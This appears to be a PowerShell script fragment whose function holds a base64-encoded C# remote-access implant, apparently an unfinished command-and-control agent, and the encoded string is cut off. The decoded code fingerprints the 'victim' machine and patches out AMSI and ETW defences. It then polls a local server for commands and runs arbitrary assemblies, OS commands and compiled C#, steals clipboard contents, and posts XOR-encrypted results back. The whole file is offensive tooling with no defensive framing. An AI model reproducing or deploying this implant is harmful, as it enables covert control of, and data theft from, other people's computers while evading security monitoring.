function Invoke-Run() {
    $encodedSource = 'dXNpbmcgU3lzdGVtOw0KdXNpbmcgU3lzdGVtLkRpYWdub3N0aWNzOw0KdXNpbmcgU3lzdGVtLk5ldDsNCnVzaW5nIFN5c3RlbS5SZWZsZWN0aW9uOw0KdXNpbmcgU3lzdGVtLlRleHQ7DQp1c2luZyBTeXN0ZW0uVGltZXJzOw0KdXNpbmcgSFRUUEltcGxhbnQuTW9kdWxlczsNCnVzaW5nIFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlczsNCnVzaW5nIFN5c3RlbS5UaHJlYWRpbmcuVGFza3M7DQoNCm5hbWVzcGFjZSBIVFRQSW1wbGFudA0Kew0KICAgIHB1YmxpYyBjbGFzcyBDb21tYW5kDQogICAgew0KICAgICAgICBwdWJsaWMgc3RyaW5nIElucHV0IHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgcHVibGljIHN0cmluZyBjb21tYW5kIHsgZ2V0OyBzZXQ7IH0gIC8vIFJlbmFtZWQgdG8gYXZvaWQgY29uZmxpY3Qgd2l0aCBjbGFzcyBuYW1lDQogICAgICAgIHB1YmxpYyBzdHJpbmcgQXJncyB7IGdldDsgc2V0OyB9DQogICAgICAgIHB1YmxpYyBzdHJpbmcgSW1wbGFudFVzZXIgeyBnZXQ7IHNldDsgfQ0KICAgICAgICBwdWJsaWMgc3RyaW5nIE9wZXJhdG9yIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgcHVibGljIHN0cmluZyBUaW1lVG9FeGVjIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgcHVibGljIHN0cmluZyBEZWxheSB7IGdldDsgc2V0OyB9DQogICAgICAgIHB1YmxpYyBzdHJpbmcgRmlsZSB7IGdldDsgc2V0OyB9DQogICAgICAgIHB1YmxpYyBzdHJpbmcgTnVsbFRlcm0geyBnZXQ7IHNldDsgfQ0KICAgIH0NCg0KICAgIHB1YmxpYyBjbGFzcyBWaWN0aW0NCiAgICB7DQogICAgICAgIHB1YmxpYyBzdHJpbmcgSUQgeyBnZXQ7IHNldDsgfSAgDQogICAgICAgIHB1YmxpYyBzdHJpbmcgRGV2aWNlTmFtZSB7IGdldDsgc2V0OyB9DQogICAgICAgIHB1YmxpYyBzdHJpbmcgVXNlcm5hbWUgeyBnZXQ7IHNldDsgfQ0KICAgICAgICBwdWJsaWMgaW50IE9wZXJhdG9ySUQgeyBnZXQ7IHNldDsgfQ0KICAgICAgICBwdWJsaWMgc3RyaW5nIE5ldHdvcmsgeyBnZXQ7IHNldDsgfQ0KICAgICAgICBwdWJsaWMgc3RyaW5nIE9wZXJhdGluZ1N5c3RlbSB7IGdldDsgc2V0OyB9DQogICAgICAgIHB1YmxpYyBzdHJpbmcgQ1BVIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgcHVibGljIHN0cmluZyBHUFUgeyBnZXQ7IHNldDsgfQ0KICAgICAgICBwdWJsaWMgaW50IFJBTSB7IGdldDsgc2V0OyB9DQogICAgICAgIHB1YmxpYyBzdHJpbmcgU3RvcmFnZSB7IGdldDsgc2V0OyB9DQogICAgICAgIHB1YmxpYyBzdHJpbmcgQ3VycmVudERhdGUgeyBnZXQ7IHNldDsgfQ0KICAgIH0NCiAgICAvLyBUaGlzIEltcGxhbnQgY2xhc3MgYWN0cyBhcyB0aGUgZW50cnkgcG9pbnQgb2YgdGhlIGltcGxhbnQgcHJvZ3JhbS4NCiAgICBwdWJsaWMgY2xhc3MgSW1wbGFudA0KICAgIHsNCiAgICAgICAgcHVibGljIHN0YXRpYyBWaWN0aW0gdmljdGltID0gbmV3IFZpY3RpbSgpOw0KICAgICAgICBwdWJsaWMgc3RyaW5nIGhvc3QgeyBnZXQ7IHNldDsgfSAgLy8gSG9zdCBvZiB0aGUgaW1wbGFudCBzZXJ2ZXINCiAgICAgICAgcHVibGljIHN0cmluZyBwb3J0IHsgZ2V0OyBzZXQ7IH0gIC8vIFBvcnQgb2YgdGhlIGltcGxhbnQgc2VydmVyDQogICAgICAgIHByaXZhdGUgc3RhdGljIHN0cmluZyBsYXN0Q29tbWFuZEV4ZWN1dGVkID0gc3RyaW5nLkVtcHR5OyAvLyBTdG9yZSB0aGUgbGFzdCBjb21tYW5kIHRoYXQgd2FzIGV4ZWN1dGVkDQoNCiAgICAgICAgcHVibGljIHN0YXRpYyB2b2lkIE1haW4oc3RyaW5nW10gYXJncykNCiAgICAgICAgew0KICAgICAgICAgICAgLypDbGlwYm9hcmRGZXRjaGVyLkdldERhdGEoKTsNCiAgICAgICAgICAgIEVudmlyb25tZW50LkV4aXQoMCk7Ki8NCiAgICAgICAgICAgIERvQXN5bmMoKS5HZXRBd2FpdGVyKCkuR2V0UmVzdWx0KCk7DQogICAgICAgIH0NCiAgICAgICAgcHVibGljIHN0YXRpYyBhc3luYyBUYXNrIERvQXN5bmMoKQ0KICAgICAgICB7DQogICAgICAgICAgICBzdHJpbmcgaW1wbGFudElkID0gRW52aXJvbm1lbnQuTWFjaGluZU5hbWU7DQogICAgICAgICAgICBzdHJpbmcgbGFzdENvbW1hbmRFeGVjdXRlZCA9IHN0cmluZy5FbXB0eTsNCg0KICAgICAgICAgICAgc3RyaW5nIHZpY3RpbV9pbmZvcm1hdGlvbiA9IEdlbmVyYXRlSnNvbigpOw0KDQogICAgICAgICAgICAvLyBDb25zb2xlLldyaXRlTGluZSh2aWN0aW1faW5mb3JtYXRpb24pOw0KICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoIlJlZ2lzdGVyaW5nIEltcGxhbnQuLi4iKTsNCg0KICAgICAgICAgICAgYXdhaXQgUmVnaXN0ZXJJbXBsYW50KHZpY3RpbV9pbmZvcm1hdGlvbik7DQogICAgICAgICAgICB2YXIgdmljdGltID0gbmV3IFZpY3RpbSgpOw0KDQogICAgICAgICAgICB2aWN0aW0gPSBHZXRWaWN0aW0odmljdGltKTsNCiAgICAgICAgICAgIC8qDQogICAgICAgICAgICBDb25zb2xlLldyaXRlTGluZSgiSUQ6ICIgKyB2aWN0aW0uSUQpOw0KICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoIkRldmljZU5hbWU6ICIgKyB2aWN0aW0uRGV2aWNlTmFtZSk7DQogICAgICAgICAgICBDb25zb2xlLldyaXRlTGluZSgiVXNlcm5hbWU6ICIgKyB2aWN0aW0uVXNlcm5hbWUpOw0KICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoIk9wZXJhdG9ySUQ6ICIgKyB2aWN0aW0uT3BlcmF0b3JJRCk7DQogICAgICAgICAgICBDb25zb2xlLldyaXRlTGluZSgiQ1BVQXJjaGl0ZWN0dXJlOiAiICsgdmljdGltLkNQVSk7DQogICAgICAgICAgICBDb25zb2xlLldyaXRlTGluZSgiR1BVSW5mbzogIiArIHZpY3RpbS5HUFUpOw0KICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoIlJBTUluZm86ICIgKyB2aWN0aW0uUkFNKTsNCiAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJPU05hbWU6ICIgKyB2aWN0aW0uT3BlcmF0aW5nU3lzdGVtKTsNCiAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJOZXR3b3JrSW5mbzogIiArIHZpY3RpbS5OZXR3b3JrKTsNCiAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJDdXJyZW50RGF0ZTogIiArIHZpY3RpbS5DdXJyZW50RGF0ZSk7DQogICAgICAgICAgICAqLw0KDQogICAgICAgICAgICBBbXNpSEJQLlN0YXJ0KCk7DQoNCiAgICAgICAgICAgIEV0d1BhdGNoLlN0YXJ0KCk7DQoNCiAgICAgICAgICAgIC8vVGVzdFN0b21wZXIoImxvY2FsaG9zdCIsICI4MDAwIiwgImNhbGM2NC5iaW4iKTsNCg0KICAgICAgICAgICAgdXNpbmcgKFdlYkNsaWVudCB3ZWJDbGllbnQgPSBuZXcgV2ViQ2xpZW50KCkpDQogICAgICAgICAgICB7DQoNCiAgICAgICAgICAgICAgICB3aGlsZSAodHJ1ZSkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHRyeQ0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICBzdHJpbmcganNvblJlc3BvbnNlID0gYXdhaXQgd2ViQ2xpZW50LkRvd25sb2FkU3RyaW5nVGFza0FzeW5jKG5ldyBVcmkoImh0dHA6Ly8xMjcuMC4wLjE6ODA4MS9nZXRDb21tYW5kIikpOw0KICAgICAgICAgICAgICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoIkdldHRpbmcgaW5zdHJ1Y3Rpb25zLi4uIik7DQoNCiAgICAgICAgICAgICAgICAgICAgICAgIENvbW1hbmQgY29tbWFuZCA9IG5ldyBDb21tYW5kKCk7DQogICAgICAgICAgICAgICAgICAgICAgICBjb21tYW5kLklucHV0ID0ganNvblJlc3BvbnNlLlNwbGl0KG5ldyBzdHJpbmdbXSB7ICJcIklucHV0XCI6XCIiLCAiXCIsXCJDb21tYW5kIiB9LCBTdHJpbmdTcGxpdE9wdGlvbnMuTm9uZSlbMV07DQogICAgICAgICAgICAgICAgICAgICAgICBjb21tYW5kLmNvbW1hbmQgPSBqc29uUmVzcG9uc2UuU3BsaXQobmV3IHN0cmluZ1tdIHsgIlwiQ29tbWFuZFwiOlwiIiwgIlwiLFwiQXJncyIgfSwgU3RyaW5nU3BsaXRPcHRpb25zLk5vbmUpWzFdOw0KICAgICAgICAgICAgICAgICAgICAgICAgY29tbWFuZC5BcmdzID0ganNvblJlc3BvbnNlLlNwbGl0KG5ldyBzdHJpbmdbXSB7ICJcIkFyZ3NcIjpcIiIsICJcIixcIkltcGxhbnRVc2VyIiB9LCBTdHJpbmdTcGxpdE9wdGlvbnMuTm9uZSlbMV07DQogICAgICAgICAgICAgICAgICAgICAgICBjb21tYW5kLkltcGxhbnRVc2VyID0ganNvblJlc3BvbnNlLlNwbGl0KG5ldyBzdHJpbmdbXSB7ICJcIkltcGxhbnRVc2VyXCI6XCIiLCAiXCIsXCJPcGVyYXRvciIgfSwgU3RyaW5nU3BsaXRPcHRpb25zLk5vbmUpWzFdOw0KICAgICAgICAgICAgICAgICAgICAgICAgY29tbWFuZC5PcGVyYXRvciA9IGpzb25SZXNwb25zZS5TcGxpdChuZXcgc3RyaW5nW10geyAiXCJPcGVyYXRvclwiOlwiIiwgIlwiLFwiZGVsYXkiIH0sIFN0cmluZ1NwbGl0T3B0aW9ucy5Ob25lKVsxXTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGNvbW1hbmQuRGVsYXkgPSBqc29uUmVzcG9uc2UuU3BsaXQobmV3IHN0cmluZ1tdIHsgIlwiZGVsYXlcIjpcIiIsICJcIixcInRpbWVUb0V4ZWMiIH0sIFN0cmluZ1NwbGl0T3B0aW9ucy5Ob25lKVsxXTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGNvbW1hbmQuVGltZVRvRXhlYyA9IGpzb25SZXNwb25zZS5TcGxpdChuZXcgc3RyaW5nW10geyAiXCJ0aW1lVG9FeGVjXCI6XCIiLCAiXCIsXCJGaWxlIiB9LCBTdHJpbmdTcGxpdE9wdGlvbnMuTm9uZSlbMV07DQogICAgICAgICAgICAgICAgICAgICAgICBjb21tYW5kLkZpbGUgPSBqc29uUmVzcG9uc2UuU3BsaXQobmV3IHN0cmluZ1tdIHsgIlwiRmlsZVwiOlwiIiwgIlwiLFwibnVsbHRlcm0iIH0sIFN0cmluZ1NwbGl0T3B0aW9ucy5Ob25lKVsxXTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGNvbW1hbmQuTnVsbFRlcm0gPSBqc29uUmVzcG9uc2UuU3BsaXQobmV3IHN0cmluZ1tdIHsgIlwibnVsbHRlcm1cIjpcIiIsICJcIn0iIH0sIFN0cmluZ1NwbGl0T3B0aW9ucy5Ob25lKVsxXTsNCg0KICAgICAgICAgICAgICAgICAgICAgICAgLypDb25zb2xlLldyaXRlTGluZSgiVXNlciBmb3IgaXNzdWVkIGNvbW1hbmQ6ICIgKyBjb21tYW5kLkltcGxhbnRVc2VyKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJDdXJyZW50IGltcGxhbnQgdXNlcjogIiArIHZpY3RpbS5Vc2VybmFtZSk7Ki8NCg0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGNvbW1hbmQuSW1wbGFudFVzZXIgPT0gdmljdGltLlVzZXJuYW1lKQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRvDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAvLyBDaGVjayBpZiBsYXN0Q29tbWFuZEV4ZWN1dGVkIGlzIGVtcHR5DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChzdHJpbmcuSXNOdWxsT3JFbXB0eShsYXN0Q29tbWFuZEV4ZWN1dGVkKSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbGFzdENvbW1hbmRFeGVjdXRlZCA9IGNvbW1hbmQuSW5wdXQ7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb250aW51ZTsgLy8gUmVzdGFydCB0aGUgbG9vcA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYXdhaXQgVGFzay5EZWxheSg1MDAwKTsNCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAvLyBVcGRhdGUgbGFzdENvbW1hbmRFeGVjdXRlZA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsYXN0Q29tbWFuZEV4ZWN1dGVkID0gY29tbWFuZC5JbnB1dDsNCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoY29tbWFuZC5JbnB1dC5UcmltKCkuRXF1YWxzKCJleGVjdXRlLWFzc2VtYmx5IiwgU3RyaW5nQ29tcGFyaXNvbi5PcmRpbmFsSWdub3JlQ2FzZSkpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJSdW5uaW5nIGFzc2VtYmx5Iik7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBieXRlW10gYnl0ZXMgPSBDb252ZXJ0LkZyb21CYXNlNjRTdHJpbmcoY29tbWFuZC5GaWxlKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cmluZyBvdXRwdXQgPSBFeGVjdXRlQXNzZW1ibHkuRXhlY3V0ZShieXRlcyk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHJpbmcgb3V0cHV0QmFzZTY0ID0gQ29udmVydC5Ub0Jhc2U2NFN0cmluZyhFbmNvZGluZy5VVEY4LkdldEJ5dGVzKG91dHB1dCkpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUob3V0cHV0KTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGF3YWl0IFNlbmRSZXN1bHQod2ViQ2xpZW50LCBpbXBsYW50SWQsIGNvbW1hbmQuT3BlcmF0b3IsIG91dHB1dEJhc2U2NCk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSBpZiAoY29tbWFuZC5JbnB1dC5UcmltKCkuRXF1YWxzKCJvcyIsIFN0cmluZ0NvbXBhcmlzb24uT3JkaW5hbElnbm9yZUNhc2UpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBDb25zb2xlLldyaXRlTGluZSgiUnVubmluZyBjb21tYW5kOiAiICsgY29tbWFuZC5jb21tYW5kKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cmluZyBvdXRwdXQgPSBDb21tYW5kcy5jb21tYW5kKGNvbW1hbmQuY29tbWFuZCwgY29tbWFuZC5BcmdzKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cmluZyBvdXRwdXRCYXNlNjQgPSBDb252ZXJ0LlRvQmFzZTY0U3RyaW5nKEVuY29kaW5nLlVURjguR2V0Qnl0ZXMob3V0cHV0KSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhd2FpdCBTZW5kUmVzdWx0KHdlYkNsaWVudCwgaW1wbGFudElkLCBjb21tYW5kLk9wZXJhdG9yLCBvdXRwdXRCYXNlNjQpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgaWYgKGNvbW1hbmQuSW5wdXQuVHJpbSgpLkVxdWFscygiY2xpcCIsIFN0cmluZ0NvbXBhcmlzb24uT3JkaW5hbElnbm9yZUNhc2UpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBDb25zb2xlLldyaXRlTGluZSgiUnVubmluZyBjbGlwYm9hcmQgZmV0Y2hlci4uLiAiKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cmluZyBvdXRwdXQgPSBDbGlwYm9hcmRGZXRjaGVyLkdldERhdGEoKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cmluZyBvdXRwdXRCYXNlNjQgPSBDb252ZXJ0LlRvQmFzZTY0U3RyaW5nKEVuY29kaW5nLlVURjguR2V0Qnl0ZXMob3V0cHV0KSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhd2FpdCBTZW5kUmVzdWx0KHdlYkNsaWVudCwgaW1wbGFudElkLCBjb21tYW5kLk9wZXJhdG9yLCBvdXRwdXRCYXNlNjQpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgaWYgKGNvbW1hbmQuSW5wdXQuVHJpbSgpLlRvTG93ZXIoKS5FcXVhbHMoImxvYWRjcyIpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHJpbmdbXSBwYXJ0cyA9IGNvbW1hbmQuRmlsZS5TcGxpdChuZXdbXSB7ICIgICIgfSwgU3RyaW5nU3BsaXRPcHRpb25zLk5vbmUpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cmluZyBlbmNvZGVkU291cmNlQ29kZSA9IHBhcnRzWzBdOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cmluZyBjbGFzc05hbWUgPSBwYXJ0c1sxXTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHJpbmcgbWV0aG9kTmFtZSA9IHBhcnRzWzJdOw0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnl0ZVtdIGRhdGEgPSBDb252ZXJ0LkZyb21CYXNlNjRTdHJpbmcoZW5jb2RlZFNvdXJjZUNvZGUpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cmluZyBkZWNvZGVkU291cmNlQ29kZSA9IEVuY29kaW5nLlVURjguR2V0U3RyaW5nKGRhdGEpOw0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoIlxyXG5cclxuRXhlY3V0aW5nOiAiICsgY2xhc3NOYW1lICsgIi4iICsgbWV0aG9kTmFtZSArICIgRm9yOiIpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJcclxuXHJcbiIgKyBkZWNvZGVkU291cmNlQ29kZSArICJcclxuXHJcbiIpOw0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQ29tcGlsZUFuZFJ1bk5FVC5FeGVjdXRlQ1MoZGVjb2RlZFNvdXJjZUNvZGUsIGNsYXNzTmFtZSwgbWV0aG9kTmFtZSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjYXRjaCAoRXhjZXB0aW9uIGV4KQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJFeGNlcHRpb24gY2F1Z2h0OiAiICsgZXguVG9TdHJpbmcoKSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9IHdoaWxlIChjb21tYW5kLklucHV0ICE9IGxhc3RDb21tYW5kRXhlY3V0ZWQpOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJObyBuZXcgY29tbWFuZHMuLi4iKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBhd2FpdCBUYXNrLkRlbGF5KDUwMDApOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIGNhdGNoIChFeGNlcHRpb24gZSkNCiAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoZS5NZXNzYWdlKTsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIHB1YmxpYyBzdGF0aWMgYXN5bmMgVGFzayBTZW5kUmVzdWx0KFdlYkNsaWVudCB3ZWJDbGllbnQsIHN0cmluZyBpbXBsYW50SWQsIHN0cmluZyBvcGVyYXRvcklkLCBzdHJpbmcgb3V0cHV0QmFzZTY0KQ0KICAgICAgICB7DQogICAgICAgICAgICBzdHJpbmcgWE9SS2V5QjY0ID0gIk5WbTVkenIxaHloT200akJUTlNGaFFHckZoUjFndmhibi9CYnZab3drTzA9IjsNCiAgICAgICAgICAgIGJ5dGVbXSBYT1JLZXkgPSBDb252ZXJ0LkZyb21CYXNlNjRTdHJpbmcoWE9SS2V5QjY0KTsNCg0KICAgICAgICAgICAgc3RyaW5nIHJlc3VsdEpzb24gPSAieyIgKyAiXCJJbXBsYW50SWRcIjogXCIiICsgaW1wbGFudElkICsgIlwiLCIgKyAiXCJPcGVyYXRvcklkXCI6IFwiIiArIG9wZXJhdG9ySWQgKyAiXCIsIiArICJcIk91dHB1dFwiOiBcIiIgKyBvdXRwdXRCYXNlNjQgKyAiXCIsIiArICJcIkRhdGVGcm9tTGFzdFwiOiBcIiIgKyBEYXRlVGltZS5VdGNOb3cuVG9TdHJpbmcoIk8iKSArICJcIiIgKyAifSI7DQogICAgICAgICAgICBieXRlW10gZW5jcnlwdGVkUmVzdWx0SnNvbiA9IFhPUihFbmNvZGluZy5VVEY4LkdldEJ5dGVzKHJlc3VsdEpzb24pLCBYT1JLZXkpOw0KDQogICAgICAgICAgICBzdHJpbmcgZGF0YSA9IENvbnZlcnQuVG9CYXNlNjRTdHJpbmcoZW5jcnlwdGVkUmVzdWx0SnNvbik7DQogICAgICAgICAgICBhd2FpdCB3ZWJDbGllbnQuVXBsb2FkU3RyaW5nVGFza0FzeW5jKG5ldyBVcmkoImh0dHA6Ly8xMjcuMC4wLjE6ODA4MS9wb3N0T3V0cHV0IiksICJQT1NUIiwgZGF0YSk7DQogICAgICAgIH0NCg0KICAgICAgICBwdWJsaWMgc3RhdGljIGJ5dGVbXSBYT1IoYnl0ZVtdIGRhdGEsIGJ5dGVbXSBrZXkpDQogICAgICAgIHsNCiAgICAgICAgICAgIGJ5dGVbXSByZXN1bHQgPSBuZXcgYnl0ZVtkYXRhLkxlbmd0aF07DQogICAgICAgICAgICBmb3IgKGludCBpID0gMDsgaSA8IGRhdGEuTGVuZ3RoOyBpKyspDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgcmVzdWx0W2ldID0gKGJ5dGUpKGRhdGFbaV0gXiBrZXlbaSAlIGtleS5MZW5ndGhdKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIHJldHVybiByZXN1bHQ7DQogICAgICAgIH0NCg0KICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBHZW5lcmF0ZUpzb24oKQ0KICAgICAgICB7DQogICAgICAgICAgICBzdHJpbmcgaWQgPSBHZXRJbXBsYW50SW5mby5HZW5lcmF0ZVJhbmRvbVN0cmluZyg2KTsgLy8gQXNzdW1pbmcgdGhpcyBpcyBhIHJhbmRvbSBzdHJpbmcNCiAgICAgICAgICAgIHN0cmluZyBkZXZpY2VOYW1lID0gR2V0SW1wbGFudEluZm8uR2V0Q29tcHV0ZXJOYW1lKCk7DQogICAgICAgICAgICBzdHJpbmcgdXNlcm5hbWUgPSBHZXRJbXBsYW50SW5mby5Vc2VybmFtZSgpOw0KICAgICAgICAgICAgc3RyaW5nIG9wZXJhdGluZ1N5c3RlbSA9IEdldEltcGxhbnRJbmZvLk9wZXJhdGluZ1N5c3RlbSgpOw0KICAgICAgICAgICAgaW50IHJhbSA9IEdldEltcGxhbnRJbmZvLlJBTSgpOyAvLyBBc3N1bWluZyBSQU0oKSByZXR1cm5zIHNvbWV0aGluZyBsaWtlICIxNiBHQiINCiAgICAgICAgICAgIHN0cmluZyBjcHUgPSBHZXRJbXBsYW50SW5mby5DUFUoKTsNCiAgICAgICAgICAgIHN0cmluZyBncHUgPSBHZXRJbXBsYW50SW5mby5HUFUoKTsNCiAgICAgICAgICAgIHN0cmluZyBzdG9yYWdlID0gR2V0SW1wbGFudEluZm8uU3RvcmFnZSgpOw0KICAgICAgICAgICAgc3RyaW5nIG5ldHdvcmsgPSBHZXRJbXBsYW50SW5mby5OZXR3b3JrKCkuUmVwbGFjZSgiXG4iLCAiXFxuIikuUmVwbGFjZSgiXHIiLCAiXFxyIikuUmVwbGFjZSgiXCIiLCAiXFxcIiIpOw0KICAgICAgICAgICAgc3RyaW5nIGN1cnJlbnREYXRlID0gR2V0SW1wbGFudEluZm8uR2V0Q3VycmVudERhdGUoKTsNCiAgICAgICAgICAgIGludCBvcGVyYXRvcklkID0gMTsNCg0KICAgICAgICAgICAgc3RyaW5nIGpzb24gPSAie1xuIiArDQogICAgICAgICAgICAgICAgIlx0XCJJRFwiOiBcIiIgKyBpZCArICJcIixcbiIgKw0KICAgICAgICAgICAgICAgICJcdFwiRGV2aWNlTmFtZVwiOiBcIiIgKyBkZXZpY2VOYW1lICsgIlwiLFxuIiArDQogICAgICAgICAgICAgICAgIlx0XCJVc2VybmFtZVwiOiBcIiIgKyB1c2VybmFtZSArICJcIixcbiIgKw0KICAgICAgICAgICAgICAgICJcdFwiT3BlcmF0b3JJRFwiOiAiICsgb3BlcmF0b3JJZCArICIsXG4iICsNCiAgICAgICAgICAgICAgICAiXHRcIkNQVUFyY2hpdGVjdHVyZVwiOiBcIiIgKyBjcHUgKyAiXCIsXG4iICsNCiAgICAgICAgICAgICAgICAiXHRcIkdQVUluZm9cIjogXCIiICsgZ3B1ICsgIlwiLFxuIiArDQogICAgICAgICAgICAgICAgIlx0XCJSQU1JbmZvXCI6ICIgKyByYW0gKyAiLFxuIiArDQogICAgICAgICAgICAgICAgIlx0XCJPU05hbWVcIjogXCIiICsgb3BlcmF0aW5nU3lzdGVtICsgIlwiLFxuIiArDQogICAgICAgICAgICAgICAgIlx0XCJOZXR3b3JrSW5mb1wiOiBcIiIgKyBuZXR3b3JrICsgIlwiLFxuIiArDQogICAgICAgICAgICAgICAgIlx0XCJDdXJyZW50RGF0ZVwiOiBcIiIgKyBjdXJyZW50RGF0ZSArICJcIlxuIiArDQogICAgICAgICAgICAifSI7DQoNCiAgICAgICAgICAgIHJldHVybiBqc29uOw0KICAgICAgICB9DQoNCiAgICAgICAgcHVibGljIHN0YXRpYyBWaWN0aW0gR2V0VmljdGltKFZpY3RpbSB2aWN0aW0pDQogICAgICAgIHsNCiAgICAgICAgICAgIHN0cmluZyBpZCA9IEdldEltcGxhbnRJbmZvLkdlbmVyYXRlUmFuZG9tU3RyaW5nKDYpOyAvLyBBc3N1bWluZyB0aGlzIGlzIGEgcmFuZG9tIHN0cmluZw0KICAgICAgICAgICAgc3RyaW5nIGRldmljZU5hbWUgPSBHZXRJbXBsYW50SW5mby5HZXRDb21wdXRlck5hbWUoKTsNCiAgICAgICAgICAgIH